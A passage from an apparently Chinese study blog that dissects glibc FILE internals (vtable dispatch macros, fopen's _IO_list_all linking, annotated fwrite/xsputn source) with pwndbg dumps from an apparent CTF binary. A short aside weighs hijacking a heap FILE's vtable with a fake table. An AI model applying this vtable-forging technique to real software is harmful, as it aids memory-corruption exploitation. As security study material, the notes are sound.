<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_sgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br></pre></td></tr></table></figure>

<p>如果展开这个宏</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_IO_XSGETN(FP, DATA, N) </span><br><span class="line">= JUMP2 (__xsgetn, FP, DATA, N)</span><br><span class="line">= (_IO_JUMPS_FUNC(FP)-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (_IO_JUMPS_FILE_plus (FP))-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (_IO_CAST_FIELD_ACCESS ((FP), struct _IO_FILE_plus, vtable))-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (FP-&gt;vtable)[__xsgetn] ) (FP, DATA, N)</span><br><span class="line"></span><br><span class="line">IO_validate_vtable接受一个vtable指针,原封不动地返回,只对这个vtable做一些校验</span><br><span class="line">=(FP-&gt;vtable)[__xsgetn](FP, DATA, N)</span><br><span class="line"></span><br><span class="line">__xsgetn可以理解为偏移量或者枚举值</span><br><span class="line">fp的vtable表中偏移量为__xsgetn处就是_IO_file_xsgetn</span><br><span class="line">=_IO_file_xsgetn (FP, DATA, N)</span><br></pre></td></tr></table></figure>





<blockquote>
<p>还有一种思路是保持真表不变,但是篡改真表上的函数指针</p>
<p>但是前提是真表所在的内存区块可写</p>
<p>然而事实上不可写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all.vtable</span><br><span class="line">$5 = (const struct _IO_jump_t *) 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">pwndbg&gt; info target</span><br><span class="line">	...</span><br><span class="line">	0x00007ffff7dcd900 - 0x00007ffff7dd0ba0 is .data.rel.ro in /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">	...</span><br><span class="line">pwndbg&gt; lm</span><br><span class="line">	...</span><br><span class="line"> 0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>

<p>只可读</p>
<p>因此只能考虑当<code>_IO_list_all</code>位于堆区时,修改其vtable指针指向假表</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$25 = (struct _IO_FILE_plus *) 0x602010</span><br><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$26 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x6020f0,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x602100,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x/30gx file</span><br><span class="line">0x602010:       0x00000000fbad2488      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602060:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602070:       0x0000000000000000      0x00007ffff7dd2540</span><br><span class="line">0x602080:       0x0000000000000003      0x0000000000000000</span><br><span class="line">0x602090:       0x0000000000000000      0x00000000006020f0</span><br><span class="line">0x6020a0:       0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x6020b0:       0x0000000000602100      0x0000000000000000</span><br><span class="line">0x6020c0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020d0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020e0:       0x0000000000000000      0x00007ffff7dd06e0	//此处为vtable指针</span><br><span class="line">0x6020f0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; lm</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x602000           0x623000 rw-p    21000 0      [heap]</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">subgraph stack[&quot;stack&quot;]</span><br><span class="line"></span><br><span class="line">	subgraph main [&quot;main frame&quot;]</span><br><span class="line">		filepointer[&quot;FILE* file&quot;]</span><br><span class="line">		style filepointer fill:RED</span><br><span class="line">	end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">subgraph glibcdata [&quot;glibc memory&quot;]</span><br><span class="line">	subgraph table [&quot;_IO_file_jumps&quot;]</span><br><span class="line">			__xsputn[&quot;__xsputn&quot;]</span><br><span class="line">			__xsgetn[&quot;__xsgetn&quot;]</span><br><span class="line">			etc[&quot;...&quot;]</span><br><span class="line">			style __xsputn fill:RED</span><br><span class="line">			style __xsgetn fill:RED</span><br><span class="line">			style etc fill:RED</span><br><span class="line">	end</span><br><span class="line">	style table fill:GREEN</span><br><span class="line">	</span><br><span class="line">	xsputn[&quot;_IO_new_file_xsputn&quot;]</span><br><span class="line">  	xsgetn[&quot;__GI__IO_file_xsgetn&quot;]</span><br><span class="line">  	style xsputn fill:YELLOW</span><br><span class="line">  	style xsgetn fill:YELLOW</span><br><span class="line">  	</span><br><span class="line">  	subgraph plus1[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stderr[&quot;struct FILE stderr&quot;]</span><br><span class="line">  		vtable1[&quot;vtable&quot;]</span><br><span class="line">  		</span><br><span class="line">  	end</span><br><span class="line">  	  subgraph plus2[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stdout[&quot;struct FILE stdout&quot;]</span><br><span class="line">  		vtable2[&quot;vtable&quot;]</span><br><span class="line">  	end</span><br><span class="line">  	  subgraph plus3[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stdin[&quot;struct FILE stdin&quot;]</span><br><span class="line">  		vtable3[&quot;vtable&quot;]</span><br><span class="line">  	end</span><br><span class="line">  	</span><br><span class="line">  	listhead[&quot;_IO_list_all&quot;]</span><br><span class="line">  	style listhead fill:RED</span><br><span class="line">  	</span><br><span class="line">  	</span><br><span class="line">  	</span><br><span class="line">  	style vtable1 fill:RED</span><br><span class="line">  	style vtable2 fill:RED</span><br><span class="line">  	style vtable3 fill:RED</span><br><span class="line">  	style stderr fill:GREEN</span><br><span class="line">	style stdout fill:GREEN</span><br><span class="line">	style stdin fill:GREEN</span><br><span class="line">	style plus1 fill:GREEN</span><br><span class="line">	style plus2 fill:GREEN</span><br><span class="line">	style plus3 fill:GREEN</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">subgraph heap [&quot;heap&quot;]</span><br><span class="line">	subgraph plus [&quot;_IO_FILE_plus&quot;]</span><br><span class="line">		file[&quot;struct FILE file&quot;]</span><br><span class="line">		vtable[&quot;vtable&quot;]	</span><br><span class="line">		style file fill:GREEN</span><br><span class="line">		style vtable fill:RED</span><br><span class="line">	end	</span><br><span class="line">	style plus fill:GREEN</span><br><span class="line">	</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filepointer--&gt;file</span><br><span class="line">vtable----&gt;table</span><br><span class="line"></span><br><span class="line">file--chain--&gt;stderr--chain--&gt;stdout--chain--&gt;stdin--chain--&gt;null</span><br><span class="line">  	__xsputn--&gt;xsputn</span><br><span class="line">  	__xsgetn--&gt;xsgetn</span><br><span class="line">listhead--&gt;plus1</span><br><span class="line">  </span><br><span class="line">subgraph example [&quot;图例&quot;]</span><br><span class="line">	function[&quot;函数&quot;]</span><br><span class="line">	style function fill:YELLOW</span><br><span class="line">	struct[&quot;对象&quot;]</span><br><span class="line">	style struct fill:GREEN</span><br><span class="line">	pointer[&quot;指针&quot;]</span><br><span class="line">	style pointer fill:RED</span><br><span class="line">end</span><br><span class="line">style example fill:GRAY</span><br></pre></td></tr></table></figure>

<p><strong>综上,fopen的作用是,创建一个新的<code>_IO_FILE_plus</code>结构体(包括FILE和vtable两部分)并初始化之,然后头插法将其链接到<code>_IO_list_all</code>链表上</strong></p>
<h3 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span></span><br></pre></td></tr></table></figure>

<p>把 <strong>ptr</strong> 所指向的数组中的数据写入到给定流 <strong>stream</strong> 中。</p>
<p>写入<code>size</code>大小的单位<code>nmemb</code>个</p>
<p>实际上调用跳转表函数<code>vtable.__xsputn</code></p>
<p>整个调用过程链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flowchart TB</span><br><span class="line">fwrite[fwrite]</span><br><span class="line">_IO_fwrite[_IO_fwrite @ glibc-2.38/libio/iofwrite.c:32]</span><br><span class="line">_IO_file_xsputn[_IO_new_file_xsputn @ glibc-2.38/libio/fileops.c:1197]</span><br><span class="line">_IO_file_overflow[</span><br><span class="line">	_IO_new_file_overflow @ glibc-2.38/libio/fileops.c:733</span><br><span class="line">	也会调用_IO_do_write将现有的缓冲区写入文件</span><br><span class="line">	然后缓冲区指针复位</span><br><span class="line">]</span><br><span class="line">_IO_do_write[_IO_new_do_write @ glibc-2.38/libio/fileops.c:425]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_do_write[</span><br><span class="line">	new_do_write @ glibc-2.38/libio/fileops.c:431</span><br><span class="line">	read缓冲区三个指针全等于_IO_buf_base</span><br><span class="line">	write缓冲区base和ptr指向_IO_buf_base, end指针指向</span><br><span class="line">]</span><br><span class="line">write[&quot;__write(f-&gt;_fileno,data,to_do)&quot;]</span><br><span class="line"></span><br><span class="line">_IO_file_write[_IO_new_file_write @ glibc-2.38/libio/fileops.c:1173]</span><br><span class="line"></span><br><span class="line">fwrite--&quot;_IO_sputn&quot;--&gt;_IO_fwrite</span><br><span class="line">_IO_fwrite--&gt;_IO_file_xsputn</span><br><span class="line">_IO_file_xsputn--&quot;_IO_OVERFLOW&quot;--&gt;_IO_file_overflow</span><br><span class="line">_IO_file_xsputn--&gt;_IO_do_write</span><br><span class="line">_IO_do_write--&gt;new_do_write</span><br><span class="line">new_do_write--&quot;_IO_SYSWRITE&quot;--&gt;_IO_file_write</span><br><span class="line">_IO_file_write--&gt;write</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>









<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)<span class="comment">//一个单位size字节,但是实际上还是以字节为单位</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> request = size * count;</span><br><span class="line">  <span class="type">size_t</span> written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);		<span class="comment">//check个寂寞</span></span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);		<span class="comment">//实际上调用_IO_new_file_xsputn</span></span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)		<span class="comment">//返回实际写入单位数,注意不是字节数</span></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;		<span class="comment">//数据指针</span></span><br><span class="line">  <span class="type">size_t</span> to_do = n;		<span class="comment">//当前还差多少个没有写入</span></span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;	<span class="comment">//行缓冲强制刷新缓冲区标志</span></span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;		<span class="comment">//当前缓冲区剩余空间</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line">  	<span class="comment">//如果要写入的大小大于一个块或者filebuf没有缓冲区,那么直接使用系统调用</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment">//如果使用行缓冲 并且 该f文件流目前正在进行写入操作</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;<span class="comment">//count表示当前写缓冲区剩余空间</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)			<span class="comment">//如果剩余空间足够大则直接写入</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )<span class="comment">//寻找最后一个\n,注意此时并未向缓冲区进行拷贝,只是寻找\n</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)		<span class="comment">//如果发现有换行符则must_flush置1表示必须刷新缓冲区</span></span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//否则如果写缓冲区中还有空间,首先计算一下剩余空间count</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)			<span class="comment">//如果剩余写缓冲区够大直接放到写缓冲区</span></span><br><span class="line">	count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);	<span class="comment">//直接从data搬到write_buf中</span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;<span class="comment">//to_do降为0表明已经写入writebuf了</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//到此已经解决了写入比较少的情况,能够直接放到write_buf中</span></span><br><span class="line">    <span class="comment">//下面还要考虑的业务有:</span></span><br><span class="line">    <span class="comment">//1.行缓冲是否有\n结尾,也就是说must_flush是否置位, 如果是,则需要刷新缓冲区(也就是写入到文件)</span></span><br><span class="line">    <span class="comment">//2.写入量很大,超过了缓冲区剩余数量</span></span><br><span class="line">    	<span class="comment">//2.1首先把现有的缓冲区写入到文件,缓冲区复位,看看能否容纳写入量</span></span><br><span class="line">    	<span class="comment">//2.2如果还容纳不了,则直接syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//如果没开启行缓冲,(也就是must_flush=0),并且写入量比较小已经放到了缓冲区,那么可以返回了,不走下面的业务,直接return</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对于行缓冲需要刷新缓冲区,或者写入量太大时首先尝试缓冲区复位, 处理方式是一样的,首先都刷新缓冲区</span></span><br><span class="line">    <span class="comment">//接下来判断一下to_do看看还有没有需要写入的,对于已完成的行缓冲情况可以返回了</span></span><br><span class="line">    <span class="comment">//对于写入量大的情况,如果刷新了缓冲区之后,to_do还是大于缓冲区大小,则直接syscall</span></span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)		<span class="comment">//如果还有to_do则表明count&lt;to_do</span></span><br><span class="line">      								<span class="comment">//如果有must_flush说明行缓冲需要刷新缓冲区</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)			<span class="comment">//刷新缓冲区,将缓冲区写入文件,调整文件指针,如果已经到达文件末尾则返回EOF</span></span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	   caller that everything has been written.  */</span></span><br><span class="line">	<span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line">      <span class="comment">//如果文件写满了,也就是EOF了,如果此时to_do为0,对应已经满足的行缓冲,返回EOF. </span></span><br><span class="line">      <span class="comment">//对于未满足的大量写入,返回已经写入的字节数n-to_do</span></span><br><span class="line">	  </span><br><span class="line">      </span><br><span class="line">	</span><br><span class="line">      <span class="comment">//如果控制流到这儿了,说明起码没有EOF</span></span><br><span class="line">      <span class="comment">//要么是已经刷新了缓冲区的行缓冲情况,要么是未满足的大量写入请求</span></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;		<span class="comment">//block_size大小是缓冲区大小</span></span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line">      <span class="comment">//如果block_size&gt;=128,则do_write = to_do - (to_do % block_size)</span></span><br><span class="line">      <span class="comment">//to_do大小可能是若干个整块最后是一个不满的块,这个不满的块大小就是(to_do % block_size)</span></span><br><span class="line">      <span class="comment">//这样算完之后,do_write就是若干整块 , 不包括最后的不满块</span></span><br><span class="line">    	</span><br><span class="line">	  <span 